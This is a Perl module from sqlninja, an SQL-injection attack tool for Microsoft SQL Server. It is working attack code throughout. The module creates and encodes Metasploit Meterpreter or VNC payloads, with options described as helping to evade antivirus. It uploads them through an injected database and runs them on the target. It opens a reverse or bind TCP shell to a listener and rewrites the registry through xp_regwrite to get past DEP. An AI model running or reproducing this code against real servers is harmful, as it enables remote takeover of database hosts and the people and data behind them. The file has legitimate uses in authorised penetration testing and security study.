# This file is part of sqlninja
# Copyright (C) 2006-2014
# http://sqlninja.sourceforge.net
# icesurfer <r00t@northernfortress.net>
# nico <nico@leidecker.info>
# 
# Sqlninja is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Sqlninja is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.

use strict;

our $conf;

# Use the metasploit framework to create a payload, upload it and execute it
# Of course, you need metasploit3 in your path
# And kudos to the whole Metasploit team
sub metasploit
{
	print "[+] Entering Metasploit module. In order to use this module ".
	   "you need to\n    have found an available TCP port, either ".
	   "inbound or outbound\n";
	# We start checking whether Metasploit is there...
	print "[+] Checking Metasploit3 availability....\n";
	my $msfcli = "";
	my $msfconsole = "";
	my $msfpayload = "";
	my $msfencode = "";
	my $msfclient = "";
	if ($conf->{'msfpath'} eq "") {
		my $path1 = $ENV{PATH};
		my @path = split(/:/,$path1);
		foreach (@path) {
			if (-e $_."/msfcli") {
				$msfcli = $_."/msfcli";
			} elsif (-e $_."/msfcli3") {
				$msfcli = $_."/msfcli3";
			}
			if (-e $_."/msfpayload") {
				$msfpayload = $_."/msfpayload";
			} elsif (-e $_."/msfpayload3") {
				$msfpayload = $_."/msfpayload3";
			}
			if (-e $_."/msfencode") {
				$msfencode = $_."/msfencode";
			} elsif (-e $_."/msfencode3") {
				$msfencode = $_."/mfsencode3";
			}
			if (-e $_."/msfconsole") {
				$msfconsole = $_."/msfconsole";
			} elsif (-e $_."/msfconsole3") {
				$msfconsole = $_."/msfconsole3";
			}	
		}
	} else {
		if ($conf->{'msfpath'} != m/\/$/) { # add a final slash, if needed
			$conf->{'msfpath'} .= "/";
		}
		if (-e $conf->{'msfpath'}."msfcli") {
			$msfcli = $conf->{'msfpath'}."msfcli";
		} elsif (-e $conf->{'msfpath'}."msfcli3") {
			$msfcli = $conf->{'msfpath'}."msfcli3";
		}
		if (-e $conf->{'msfpath'}."msfpayload") {
			$msfpayload = $conf->{'msfpath'}."msfpayload";
		} elsif (-e $conf->{'msfpath'}."msfpayload3") {
			$msfpayload = $conf->{'msfpath'}."msfpayload3";
		}
		if (-e $conf->{'msfpath'}."msfencode") {
			$msfencode = $conf->{'msfpath'}."msfencode";
		} elsif (-e $conf->{'msfpath'}."msfencode3") {
			$msfencode = $conf->{'msfpath'}."msfencode3";
		}
		if (-e $conf->{'msfpath'}."msfconsole") {
			$msfconsole = $conf->{'msfpath'}."msfconsole";
		} elsif (-e $conf->{'msfpath'}."msfconsole3") {
			$msfconsole = $conf->{'msfpath'}."msfconsole3";
		}
	}
	if (($conf->{'msfclient'} eq "msfcli") and ($msfcli eq "")) {
		print "[-] msfcli not found\n";
		exit(-1);
	}
	if (($conf->{'msfclient'} eq "msfconsole") and ($msfconsole eq "")) {
		print "[-] msfconsole not found\n";
		exit(-1);
	}
	if ($msfpayload eq "") {
		print "[-] msfpayload not found\n";
		exit(-1);
	}
	if (($msfencode eq "") and ($conf->{'msfencoder'} ne "")) {
		print "[-] msfencode not found\n";
		exit(-1);
	}
	my $fileformat = "";
	print "[+] Which file format you want to use?\n";
	print "    1: Powershell (helps evading AV)\n    2: PE executable (works on older servers)\n";
	while (($fileformat !=1) and ($fileformat != 2)) {
		print "> ";
		$fileformat = <STDIN>;
		chomp($fileformat);
	}
	if ($fileformat == 1) {
		$fileformat = ".ps1";
	} else {
		$fileformat = ".exe";
	}
	print "[+] Which payload you want to use?\n";
	print "    1: Meterpreter\n    2: VNC\n";
	my $payload;
	while (($payload != 1) and ($payload != 2)) {
		print "> ";
		$payload = <STDIN>;
		chomp($payload);
	}
	if ($payload == 1) {
		$payload = "meterpreter";
	} else {
		$payload = "vncinject";
	}
	print "[+] Which type of connection you want to use?\n";
	print "    1: bind_tcp\n    2: reverse_tcp\n";
	my $conn;
	while (($conn ne "1") and ($conn ne "2")) {
		print "> ";
		$conn = <STDIN>;
		chomp($conn);
	}
	if ($conn == 1) {
		$conn = "bind_tcp";
	} else {
		$conn = "reverse_tcp";
	}
	my $host2;
	if ($conn eq "bind_tcp") {
		print "[+] Enter remote host [".$conf->{'host'}."]\n> ";
		$host2 = <STDIN>;
		chomp $host2;
		if ($host2 eq "") {
			$host2 = $conf->{'host'};
		}
	}
	if ($conn eq "bind_tcp") {
		print "[+] Enter remote port number\n";
	} else {
		print "[+] Enter local port number\n";
	}
	my $port = 0;
	while (($port < 1) or ($port > 65535)) {
		print "> ";
		$port = <STDIN>;
		chomp($port);
	}

	# ok... let's start the fun
	# We start creating the payload executable
	# We use a random name, because using the same name twice would
	# create problems if the first executable is still running
	my $stager = "met".int(rand()*65535).$fileformat;
	my $command = $msfpayload." windows/".$payload."/".$conn.
		" exitfunc=process lport=".$port." ";
	if ($conn ne "bind_tcp") {
		$command .= " lhost=".$conf->{'lhost'}." ";
	}
	my $stagertype;
	if ($fileformat eq ".exe") {
		$stagertype = "exe";
	} else {
		$stagertype = "psh";
	}
	# Now, it seems that you need msfencoder to use Powershell...
	if (($conf->{'msfencoder'} eq "") and ($fileformat eq ".exe")) {
		$command .= " X > /tmp/".$stager;
	} else {
		if ($conf->{'msfencoder'} eq "") {
			$conf->{'msfencoder'} = "x86/shikata_ga_nai";
		}
		$command .= " R | ".$msfencode.
			    " -e ".$conf->{'msfencoder'}.
			    " -c ".$conf->{'msfencodecount'}.
			    " -t ".$stagertype.
			    " -o /tmp/".$stager;
	}
	if ($conf->{'verbose'} == 1) {
		print "[v] Command: ".$command."\n";
	}
	print "[+] Calling msfpayload3 to create the payload...\n";
	system ($command);
	unless (-e "/tmp/".$stager) {
		print "[-] Payload creation failed\n";
		exit(-1);
	}
	print "[+] Payload (".$stager.") created. Now uploading it\n";
	upload("/tmp/".$stager);
	system ("rm /tmp/".$stager);

	my $cmd;
	if ($conf->{'checkdep'} eq "yes") {
		# We might have to disable DEP for met.exe
		print "[+] Checking if DEP (Data Execution Prevention) ".
	       		"is enabled on target\n";
		$cmd = "declare \@a nvarchar(999) ".
	       		"EXEC master..xp_regread 'HKEY_LOCAL_MACHINE',".
	       		"'SYSTEM\\CurrentControlSet\\Control',".
	       		"'SystemStartOptions',\@a OUTPUT ".
	       		"if \@a like '%NOEXECUTE%' waitfor delay '0:0:"
						.$conf->{'blindtime'}."'";
		my $result = tryblind($cmd);
		if ($result > ($conf->{'blindtime'} - 2)) {
			handledep($stager);
		} else {
			print "[+] No DEP detected.... good\n";
		}
	}
	
	# A couple of variables to handle some delays, depending on
	# who starts the connection
	my $delayclient = 0;
	my $delayserver = 0;
	if ($conn eq "bind_tcp") {
		$delayclient = 3;
	} else {
		$delayserver = $conf->{'msfserverdelay'}; # msfconsole can take a while to start
	}
	# The child handles the request to the target, the parent
	# calls Metasploit
	my $pid = fork();
	if ($pid == 0) {
		# Launch met.exe 
		if ($delayserver > 0) {
			print "[+] waiting ".$delayserver." seconds before running the stager on the server\n"; 
			sleep($delayserver);
		}
		if ($fileformat eq ".exe") {
			$cmd = "%TEMP%\\".$stager;
			if ($conf->{'churrasco'} == 1) {
				  $cmd = usechurrasco($cmd);
			}
		} else {
			$cmd = "powershell.exe ".$conf->{'ps1params'}." -file %TEMP%\\".$stager;
		}
		print_verbose("Remotely running: ".$cmd."\n");
		$command = createcommand($cmd);
		sendrequest($command);
		exit(0);
	}
	# This is the parent
	if ($delayclient > 0) {
		print "[+] waiting ".$delayclient." seconds before starting ".$conf->{'msfclient'}."\n";
		sleep($delayclient);
	}
	if ($conf->{'msfclient'} eq "msfcli") {
		runmsfcli($msfcli, $payload, $conn, $port, $host2);
	} else {
		runmsfconsole($msfconsole, $payload, $conn, $port, $host2);
	}
	exit(0);
}

sub runmsfcli
{
	my $msfcli = $_[0];
	my $payload = $_[1];
	my $conn = $_[2];
	my $port = $_[3];
	my $host2 = $_[4];
	my $syscommand = $msfcli." multi/handler ".
	              "payload=windows/".$payload."/".$conn." ";
	if ($conn eq "bind_tcp") {
		$syscommand .= "lport=".$port." rhost=".$host2." E";
	} else {
		$syscommand .= "lport=".$port." lhost=".$conf->{'lhost'}." E";
	}
	if ($conf->{'verbose'} == 1) {
		print "[v] Executing: ".$syscommand."\n";
	}
	print "[+] Transferring control to msfcli. Have fun!\n\n";
	system($syscommand);
}

sub runmsfconsole
{
	my $msfconsole = $_[0];
	my $payload = $_[1];
	my $conn = $_[2];
	my $port = $_[3];
 	my $host2 = $_[4];
	# create the script
	my $rcscript = -1;
	while ($rcscript == -1) {
		my $tmpfile = "/tmp/msfscript-".int(rand()*999999).".rc";
		if (!(-e $tmpfile)) {
			$rcscript = $tmpfile;
		}
	}
	open (OUT, ">".$rcscript);
	print OUT "use exploit/multi/handler\n";
	print OUT "set payload windows/".$payload."/".$conn."\n";
	print OUT "set lport ".$port."\n";
	if ($conn eq "bind_tcp") {
		print OUT "set rhost ".$host2."\n";
	} else {
		print OUT "set lhost ".$conf->{'lhost'}."\n";
	}
	print OUT "exploit -j\n";
	close OUT;
	print "[+] Transferring control to msfconsole (might take a while to load). Have fun!\n\n";
	system($msfconsole." -r ".$rcscript);
}


# Windows Server 2003 SP1+ has DEP enabled.... we need to take care of this
sub handledep
{
	my $stager = $_[0];
	my $dep;
	my $cmd;
	my $result;

	# This is the generic query to check what configuration is in place
	my $depquery1 = "declare \@a nvarchar(100) ".
			"EXEC master..xp_regread 'HKEY_LOCAL_MACHINE',".
			"'SYSTEM\\CurrentControlSet\\Control',".
			"'SystemStartOptions',\@a OUTPUT ".
			"if \@a like '%";
	my $depquery2 = "%' waitfor delay '0:0:".$conf->{'blindtime'}."'";

	# We start with "OptOut", which should be the default
	$cmd = $depquery1."OPTOUT".$depquery2;
	$result = tryblind($cmd);
	if ($result > ($conf->{'blindtime'} - 2)) {
		$dep = "OptOut";
	}
	if ($dep eq "") {
		$cmd = $depquery1."OPTIN".$depquery2;
		$result = tryblind($cmd);
		if ($result > ($conf->{'blindtime'} - 2)) {
			$dep = "OptIn";
		}
	}
	if ($dep eq "") {
		$cmd = $depquery1."ALWAYSON".$depquery2;
		$result = tryblind($cmd);
		if ($result > ($conf->{'blindtime'} - 2)) {
			$dep = "AlwaysOn";
		} else {
			$dep = "AlwaysOff";
		}
	}
	if (($dep eq "OptIn") or ($dep eq "AlwaysOff")) {
		print "[+] DEP is marked as ".$dep.". We should be fine\n";
		return;
	} elsif ($dep eq "AlwaysOn") {
		print "[-] DEP is marked as AlwaysOn... \n".
		      "[-] Will try my best but don't count on it too much\n";
	} else {
		print "[+] DEP is marked as OptOut...trying to disable it\n";
	}

	# Whitelist our executable
	# $cmd = "exec xp_regdeletekey 'HKEY_LOCAL_MACHINE','Software\\".
	#   "Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers'";
	#sendrequest($cmd);

	my $table = "##ice".int(rand()*9999);
	$cmd = "declare \@b nvarchar(999) ".
	  "create table ".$table." (a nvarchar(999)) ". 
	  "insert into ".$table." exec master..".$conf->{'xp_name'}." 'echo %TEMP%' ".
	  "set \@b = (select top 1 * from ".$table.")+'\\".$stager.".exe' ".
	  "exec master..xp_regwrite 'HKEY_LOCAL_MACHINE',".
	  "'Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers',".
	  "\@b,'REG_SZ','DisableNXShowUI' ".
	  "drop table ".$table;
	 sendrequest($cmd);
	# God bless xp_regread and xp_regwrite... 
	# Two authentic backdoors by design
}

1;